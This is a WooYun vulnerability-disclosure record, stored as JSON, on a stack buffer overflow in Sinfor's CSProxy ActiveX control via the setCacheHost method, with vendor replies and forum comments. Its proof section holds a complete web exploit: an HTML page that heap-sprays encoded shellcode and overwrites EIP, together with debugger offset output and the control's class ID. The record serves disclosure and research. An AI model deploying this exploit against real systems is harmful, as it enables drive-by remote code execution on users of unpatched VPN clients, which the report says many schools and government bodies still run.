{"id": 6074, "wybug_id": "wooyun-2013-042986", "wybug_title": "#3 Sinfor CSProxy Class Activex Remote Code Execution", "wybug_corp": "深信服", "wybug_author": "想要减肥的胖纸", "wybug_date": "2013-11-15 13:55", "wybug_open_date": "2014-02-13 13:56", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["缓冲区溢出", "漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-11-18：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-01-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-01-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-01-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-02-13：\t细节向公众公开  简要描述： Looking for cyclic pattern in memory    EIP overwritten with lower pattern : 0x6a61326a (offset 277)    ECX overwritten with lower pattern : 0x6a61326a (offset 277)[+] Examining SEH chain    SEH record (nseh field) at 0x016ad18c overwritten with lower pattern : 0x6a61326a (offset 273), followed by 4 bytes of cyclic data[+] Examining stack (entire stack) - looking for cyclic pattern    Walking stack from 0x0168f000 to 0x016afffc (0x00020ffc bytes)    0x016ad07d : Contains lower cyclic pattern at ESP+0x435 (+1077) : offset 2, length 259 (-> 0x016ad17f : ESP+0x538)    0x016ad185 : Contains lower cyclic pattern at ESP+0x53d (+1341) : offset 266, length 15 (-> 0x016ad193 : ESP+0x54c)    0x016ad199 : Contains lower cyclic pattern at ESP+0x551 (+1361) : offset 286, length 7714 (-> 0x016aefba : ESP+0x2373) 详细说明：  \n名称:         CSProxy Class发行者:        Sinfor Technologies  Co.,Ltd类型:         ActiveX 控件版本:         4. 2. 1. 3文件日期:       上次访问日期:     2013年11月15日，13:03类 ID:       {53EC2F48-968E-4A42-B99B-9F6571474213}使用计数:       765阻止次数:       0文件:         ProxyIE.dll文件夹:        C:\\Program Files\\Sinfor\\SSL\\ClientComponent3\nsetCacheHost提交大于276个字符之后溢出mona计算的偏移\n+] Looking for cyclic pattern in memory    EIP overwritten with lower pattern : 0x6a61326a (offset 277)    ECX overwritten with lower pattern : 0x6a61326a (offset 277)[+] Examining SEH chain    SEH record (nseh field) at 0x016ad18c overwritten with lower pattern : 0x6a61326a (offset 273), followed by 4 bytes of cyclic data[+] Examining stack (entire stack) - looking for cyclic pattern    Walking stack from 0x0168f000 to 0x016afffc (0x00020ffc bytes)    0x016ad07d : Contains lower cyclic pattern at ESP+0x435 (+1077) : offset 2, length 259 (-> 0x016ad17f : ESP+0x538)    0x016ad185 : Contains lower cyclic pattern at ESP+0x53d (+1341) : offset 266, length 15 (-> 0x016ad193 : ESP+0x54c)    0x016ad199 : Contains lower cyclic pattern at ESP+0x551 (+1361) : offset 286, length 7714 (-> 0x016aefba : ESP+0x2373)\n0x033829b7 msvcrt._strlwr把字符转成小写 所以mona计算的偏移可能不准确   漏洞证明：  \n<html><head>   \t<title>Sangfor Activex overflow PoC</title></head><!--0x033829b7 msvcrt._strlwr把字符转成小写--><body>    <object classid=\"clsid:53EC2F48-968E-4A42-B99B-9F6571474213\" id='poc'></object>    <script>junk1 = \"\";while(junk1.length < 276) junk1+=\"A\";eip = \"DDDD\";payload = junk1 + eip;poc.setCacheHost(payload);   </script></body></html>\nDDDD被转换成dddd 覆盖eip 见下图\n\n\n<html> <title>Sangfor Activex overflow PoC</title>  <object classid='clsid:53EC2F48-968E-4A42-B99B-9F6571474213' id='target' ></object><script >var shellcode = unescape('%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%uc031%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf0e2%u5752%u528b%u8b10%u3c42%ud001%u408b%u8578%u74c0%u014a%u50d0%u488b%u8b18%u2058%ud301%u3ce3%u8b49%u8b34%ud601%uff31%uc031%uc1ac%u0dcf%uc701%ue038%uf475%u7d03%u3bf8%u247d%ue275%u8b58%u2458%ud301%u8b66%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489%u2424%u5b5b%u5961%u515a%ue0ff%u5f58%u8b5a%ueb12%u5d86%u016a%u858d%u00b9%u0000%u6850%u8b31%u876f%ud5ff%uf0bb%ua2b5%u6856%u95a6%u9dbd%ud5ff%u063c%u0a7c%ufb80%u75e0%ubb05%u1347%u6f72%u006a%uff53%u63d5%u6c61%u0063');var bigblock = unescape('%u\\9090%u\\9090');var headersize = 20;var slackspace = headersize + shellcode.length;while (bigblock.length < slackspace) bigblock += bigblock;var fillblock = bigblock.substring(0,slackspace);var block = bigblock.substring(0,bigblock.length - slackspace);while (block.length + slackspace < 0x40000) block = block + block + fillblock;var memory = new Array();for (i = 0; i < 500; i++){ memory[i] = block + shellcode }junk1 = \"\";while(junk1.length < 276) junk1+=\"C\";eip = \"\\x0c\\x0c\\x0c\\x0c\";payload = junk1 + eip;target.setCacheHost(payload);</script></html>\n   修复方案：     版权声明：转载请注明来源 想要减肥的胖纸@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2013-11-15 17:23 厂商回复： 亲，跟你上次提交的属同类问题。补丁包已发，这台估计还没升级。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-11-15 13:56 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  你为何那么屌    \n     2013-11-15 13:57 |    \t\t霍大然 \t\t\t( 普通白帽子  |\t\t\t        Rank:1136 漏洞数:178        | W币花完了，刷分还是不刷？)\t\t \n  要往国际版发？    \n     2013-11-15 14:02 |    \t\t想要减肥的胖纸 \t\t\t( 普通白帽子  |\t\t\t        Rank:250 漏洞数:42        )\t\t \n  @xsser 不吊，找到stackpiovt之后发现太纠结了，到rop不能执行了。猜测和大小写转换有关。唉，我是刚研究这方面的菜鸟，继续调试下下个漏洞，看看会不会还这么纠结。相关图 见http://zone.wooyun.org/content/8262    \n     2013-11-15 14:25 |    \t\t一只猿 \t\t\t( 普通白帽子  |\t\t\t        Rank:463 漏洞数:89        | 硬件与无线通信研究方向)\t\t \n  你为何那么屌     \n     2013-11-15 14:47 |    \t\t雷锋 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:2        | 承接:钻井，架工，木工，电工，水暖工，力...)\t\t \n  你为何这么吊    \n     2013-11-15 15:01 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  @想要减肥的胖纸 大哥 是sangfor 还是sinfor？     \n     2013-11-15 15:09 |    \t\t想要减肥的胖纸 \t\t\t( 普通白帽子  |\t\t\t        Rank:250 漏洞数:42        )\t\t \n  @zzR 原来叫sinfor    \n     2013-11-15 15:26 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  @想要减肥的胖纸 soga    \n     2013-11-15 19:35 |    \t\t想要减肥的胖纸 \t\t\t( 普通白帽子  |\t\t\t        Rank:250 漏洞数:42        )\t\t \n  @深信服 我想弱弱的问一下，厂商有没有提示用户升级？当用户第一次使用vpn的时候提示安装控件，然后你们更新应该是推送到vpn设备上的，把原来的控件包替换，但是客户端本身能不能有像微软那种自动更新？如果没有提示用户更新，用户未更新，还是有很大风险被APT的。    \n     2013-11-15 19:36 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @想要减肥的胖纸 @360安全卫士    \n     2013-11-15 20:31 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  你为何这么屌    \n     2013-11-15 20:46 |    \t\tSct7p \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:9        | 懂与不懂之间只隔了一层纸，懂的人会觉得很...)\t\t \n  你家里人知道这么屌吗？    \n     2013-11-18 14:09 |    \t\t深信服(乌云厂商)\t\t \n  @想要减肥的胖纸 客户端控件有自动更新的.当控件推送到VPN设备上后，用户下次登录VPN时就会自动更新使用的控件.    \n     2013-11-18 15:49 |    \t\t想要减肥的胖纸 \t\t\t( 普通白帽子  |\t\t\t        Rank:250 漏洞数:42        )\t\t \n  @深信服 可是我看到好多地方没更新 百度 google一下 好多学校、科研机构、政府部门。都是老版本控件版本。希望你们能自查下 然后通知用户更新。    \n     2013-11-18 16:50 |    \t\t深信服(乌云厂商)\t\t \n  @想要减肥的胖纸 谢谢！    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}